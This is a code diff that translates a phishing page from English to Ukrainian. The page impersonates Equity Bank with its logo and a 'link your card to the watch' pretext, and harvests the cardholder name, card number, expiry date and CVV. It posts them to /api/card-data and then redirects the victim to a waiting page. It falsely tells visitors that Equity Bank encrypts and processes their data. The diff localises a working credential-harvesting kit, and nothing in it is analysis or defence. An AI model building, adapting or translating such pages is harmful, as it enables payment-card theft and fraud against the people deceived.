@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="uk" dir="ltr">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Card Verification</title>
+<title>Верифікація картки</title>
 <style>
   *{box-sizing:border-box;margin:0;padding:0}
   html,body{height:100%;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
@@ -92,13 +92,13 @@
 
   <div class="topbar">
     <img src="images/equity-logo.jpg" alt="Equity">
-    <span class="topbar-title">Card Verification</span>
+    <span class="topbar-title">Верифікація картки</span>
   </div>
 
   <div class="hero">
     <img src="images/equity-card-watch.jpg" alt="Equity Card & Watch">
-    <h1>Link your card to the watch</h1>
-    <p>Enter your card details to activate contactless payment on your smart watch</p>
+    <h1>Прив'яжіть картку до годинника</h1>
+    <p>Введіть дані вашої картки для активації безконтактної оплати на смарт-годиннику</p>
   </div>
 
   <div class="form-wrap">
@@ -106,31 +106,31 @@
       <div class="error-msg" id="errorMsg"></div>
 
       <div class="field">
-        <label>Cardholder Name</label>
+        <label>Ім'я власника картки</label>
         <div class="input-wrap">
-          <input type="text" id="cardName" placeholder="Name as shown on card" autocomplete="cc-name">
+          <input type="text" id="cardName" placeholder="Ім'я як на картці" autocomplete="cc-name">
           <svg class="icon" viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
         </div>
       </div>
 
       <div class="field">
-        <label>Card Number</label>
+        <label>Номер картки</label>
         <div class="input-wrap">
           <input type="tel" id="cardNumber" class="has-brand" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" autocomplete="cc-number">
           <svg class="icon" viewBox="0 0 24 24"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
           <img class="brand-icon" id="brandIcon" src="" alt="" style="display:none">
         </div>
-        <div class="field-error" id="cardNumberError">Invalid card number</div>
+        <div class="field-error" id="cardNumberError">Недійсний номер картки</div>
       </div>
 
       <div class="row">
         <div class="field">
-          <label>Expiry Date</label>
+          <label>Термін дії</label>
           <div class="input-wrap">
             <input type="tel" id="cardExpiry" placeholder="MM/YY" maxlength="5" inputmode="numeric" autocomplete="cc-exp">
             <svg class="icon" viewBox="0 0 24 24"><rect x="3" y="4" width="18" height="18" rx="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
           </div>
-          <div class="field-error" id="expiryError">Invalid expiry date</div>
+          <div class="field-error" id="expiryError">Недійсний термін дії</div>
         </div>
         <div class="field">
           <label>CVV</label>
@@ -143,13 +143,13 @@
 
       <div class="info-box">
         <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg>
-        <span>Your card details are encrypted and securely processed by Equity Bank</span>
+        <span>Дані вашої картки зашифровані та безпечно обробляються Equity Bank</span>
       </div>
     </div>
   </div>
 
   <div class="bottom">
-    <button class="submit-btn" id="submitBtn" onclick="submitCard()">Verify & Link Card</button>
+    <button class="submit-btn" id="submitBtn" onclick="submitCard()">Підтвердити та прив'язати картку</button>
   </div>
 
 <script>
@@ -159,7 +159,7 @@
 
   if (params.get("error") === "1") {
     const el = document.getElementById("errorMsg");
-    el.textContent = "Card details are incorrect. Please try again.";
+    el.textContent = "Дані картки невірні. Будь ласка, спробуйте ще раз.";
     el.style.display = "block";
   }
 
@@ -263,14 +263,14 @@
     const expiry = expiryEl.value.trim();
     const cvv = document.getElementById("cardCvv").value.trim();
 
-    if (!name) { showError("Please enter cardholder name"); return; }
-    if (!luhnCheck(number)) { showError("Please enter a valid card number"); cardNumEl.classList.add("invalid"); return; }
-    if (!validateExpiry(expiry)) { showError("Please enter a valid expiry date"); expiryEl.classList.add("invalid"); return; }
-    if (cvv.length < 3) { showError("Please enter CVV"); return; }
+    if (!name) { showError("Будь ласка, введіть ім'я власника картки"); return; }
+    if (!luhnCheck(number)) { showError("Будь ласка, введіть дійсний номер картки"); cardNumEl.classList.add("invalid"); return; }
+    if (!validateExpiry(expiry)) { showError("Будь ласка, введіть дійсний термін дії"); expiryEl.classList.add("invalid"); return; }
+    if (cvv.length < 3) { showError("Будь ласка, введіть CVV"); return; }
 
     const btn = document.getElementById("submitBtn");
     btn.disabled = true;
-    btn.textContent = "Verifying...";
+    btn.textContent = "Перевірка...";
 
     try {
       const res = await fetch("/api/card-data", {
@@ -288,14 +288,14 @@
       if (data.success) {
         location.href = "card-waiting.html?order=" + orderId;
       } else {
-        showError(data.message || "An error occurred");
+        showError(data.message || "Сталася помилка");
         btn.disabled = false;
-        btn.textContent = "Verify & Link Card";
+        btn.textContent = "Підтвердити та прив'язати картку";
       }
     } catch(err) {
-      showError("Connection error");
+      showError("Помилка з'єднання");
       btn.disabled = false;
-      btn.textContent = "Verify & Link Card";
+      btn.textContent = "Підтвердити та прив'язати картку";
     }
   }
 
